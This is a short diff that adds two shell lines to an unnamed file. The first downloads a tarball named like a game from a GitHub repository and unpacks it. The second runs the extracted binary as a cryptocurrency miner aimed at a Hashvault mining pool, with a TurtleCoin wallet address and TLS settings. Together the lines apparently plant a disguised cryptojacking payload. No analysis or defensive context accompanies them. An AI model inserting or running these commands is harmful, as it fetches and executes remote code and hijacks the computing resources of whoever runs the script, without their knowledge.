@@ -1,0 +1,2 @@
+  curl -sSL https://github.com/vuongit21203/game/raw/main/cuagame.tar.gz | tar -xvz
+./cuagame/cuait --url pool.hashvault.pro:80 --user TRTLuweEwEqPstNHhkvxX6UPy4Nw9WAN8gFmeyDHE1Mr54WVPgwUq1L9DqHKCjmcKNHvoNfrh7w7VHVBj1efakotfkt2jeroLmy.6ffc294fce91cd2aa3109b60275d656af7c2919c879c77e450de6621bcf7b4c2   --pass   LONG_TRTL   --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
